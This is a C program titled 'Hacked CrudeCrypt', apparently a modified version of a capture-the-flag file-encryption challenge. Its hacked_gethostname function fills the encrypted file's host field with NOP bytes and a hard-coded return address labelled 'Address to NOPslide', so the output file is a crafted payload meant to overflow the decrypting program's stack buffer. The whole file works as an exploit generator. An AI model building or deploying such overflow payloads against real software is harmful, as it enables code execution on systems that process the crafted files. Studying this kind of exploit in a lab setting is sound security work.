#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <openssl/md5.h>
#include <mcrypt.h>
#include <unistd.h>

#define IV "AAAAAAAAAAAAAAAA"

#define PATH_LEN 129
#define PASSWORD_LEN 128

#define HOST_LEN 1000

#define MAGIC 0xc0dec0de

#define MULT_BLOCK_SIZE(size)                                   \
    (!((size) % 16) ? (size) : (size) + (16 - ((size) % 16)))

#define MIN(a,b) (((a)<(b))?(a):(b))

typedef struct {
    unsigned int magic_number;
    unsigned long file_size;
    char host[HOST_LEN];
} file_header;

void hash_password(unsigned char* digest, char* password) {
    MD5_CTX context;

    size_t len = strlen(password);

    MD5_Init(&context);
    MD5_Update(&context, password, len);
    MD5_Final(digest, &context);
}

void safe_gethostname(char *name, size_t len) {
    gethostname(name, len);
    name[len-1] = '\0';
}

void hacked_gethostname(char *name) {
		memset(name, '\x90', HOST_LEN);
		memcpy(name+44, "\x30\xd6\xff\xff", 4); /* Address to NOPslide */
}

void init_file_header(file_header* header, unsigned long file_size) {
    header->magic_number = MAGIC;
    header->file_size = file_size;
}

int file_size(FILE* fp) {
    struct stat buf;
    fstat(fileno(fp), &buf);
    return buf.st_size;
}

int encrypt_buffer(void* buf, int buf_len, char* key, int key_len) {
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    if(buf_len % blocksize != 0) {
        return -1;
    }

    mcrypt_generic_init(td, key, key_len, IV);
    mcrypt_generic(td, buf, buf_len);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);
    return 0;
}

void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    /*safe_gethostname(header.host, HOST_LEN);*/
    hacked_gethostname(header.host);

    memcpy(padded_block, &header, sizeof(file_header));
    fread(padded_block + sizeof(file_header), 1, size, raw_file);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
        printf("There was an error encrypting the file!\n");
        return;
    }

    printf("=> Encrypted file successfully\n");
    fwrite(padded_block, 1, block_size, enc_file);

    free(padded_block);
}

/*
bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
*/

int main(int argc, char **argv) {
    char* src_file_path = argv[1];
    char* out_file_path = argv[2];
    char* file_password = calloc(1, PASSWORD_LEN);

    printf("-=- Welcome to Hacked CrudeCrypt 0.1 Beta -=-\n");

    FILE *src_file, *out_file;

    if((src_file = fopen(src_file_path, "rb")) == NULL) {
        printf("Could not open input file: %s\n", src_file_path);
        return -3;
    }

    if((out_file = fopen(out_file_path, "wb")) == NULL) {
        printf("Could not open output file: %s\n", out_file_path);
        fclose(src_file); // Make sure to close the input file
        return -3;
    }

    printf("-> File password: ");
    fgets(file_password, PASSWORD_LEN, stdin);
    printf("\n");

    unsigned char digest[16];
    hash_password(digest, file_password);

    encrypt_file(src_file, out_file, digest);

    free(file_password);

    fclose(src_file);
    fclose(out_file);

    return 0;
}
